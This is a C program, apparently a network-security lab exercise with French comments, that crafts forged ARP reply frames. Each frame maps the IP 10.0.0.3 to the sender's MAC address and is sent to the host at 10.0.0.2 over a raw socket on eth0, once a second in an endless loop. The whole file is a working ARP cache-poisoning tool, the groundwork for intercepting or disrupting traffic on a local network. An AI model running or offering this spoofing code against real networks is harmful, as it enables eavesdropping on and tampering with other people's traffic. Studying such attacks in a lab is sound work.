#include <arpa/inet.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <unistd.h>

int main() {
  // Partie Ethernet
  unsigned char dest_mac[6] = {0xfa, 0x10, 0xec, 0xe6, 0x16, 0xd0};
  unsigned char src_mac[6] = {0x3e, 0xaf, 0x19, 0x5a, 0x02, 0xfb};
    unsigned char type[2] = {0x08, 0x06};
  // Partie Ip
    unsigned char hard_type[2] = {0x00, 0x01};
    unsigned char hard_proto[2] = {0x08, 0x00};
    unsigned char hard_add[1] = {0x06};
    unsigned char proto_len[1] = {0x04};
    unsigned char operation[2] = {0x00, 0x02};
    unsigned char send_mac[6] = {0x3e, 0xaf, 0x19, 0x5a, 0x02, 0xfb};
    unsigned char send_ip[4] = {0x0a, 0x00, 0x00, 0x03};
    unsigned char recv_mac[6] = {0xfa, 0x10, 0xec, 0xe6, 0x16, 0xd0};
    unsigned char recv_ip[4] = {0x0a, 0x00, 0x00, 0x02};

    // Partie alocation du packet
    unsigned char frame[1500];

    memset(frame, 0, 60);

    for (int i = 0; i < 6; i++) {
      frame[i] = dest_mac[i];
    }

  for (int i = 0; i < 6; i++) {
    frame[6 + i] = src_mac[i];
  }

  frame[12] = 0x08;
  frame[13] = 0x06;

  frame[14] = hard_type[0];
  frame[15] = hard_type[1];
  frame[16] = hard_proto[0];
  frame[17] = hard_proto[1];
  frame[18] = hard_add[0];
  frame[19] = proto_len[0];
  frame[20] = operation[0];
  frame[21] = operation[1];

  for (int i = 0; i < 6; i++) {
    frame[22 + i] = send_mac[i];
  }

  for (int i = 0; i < 4; i++) {
    frame[28 + i] = send_ip[i];
  }

  for (int i = 0; i < 6; i++) {
    frame[32 + i] = recv_mac[i];
  }

  for (int i = 0; i < 4; i++) {
    frame[38 + i] = recv_ip[i];
  }


  int frame_len = 60;

  int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
  if (sock < 0) {
    perror("socket");
    return 1;
  }

  struct sockaddr_ll addr;
  memset(&addr, 0, sizeof(addr));
  addr.sll_family = AF_PACKET;
  addr.sll_ifindex = if_nametoindex("eth0");
  addr.sll_halen = 6;
  memcpy(addr.sll_addr, dest_mac, 6);

  for (;;){
  ssize_t sent =
      sendto(sock, frame, frame_len, 0, (struct sockaddr *)&addr, sizeof(addr));

  if (sent < 0) {
    perror("sendto");
    return 1;
  }

  sleep(1);
  }
  close(sock);

  return 0;
}
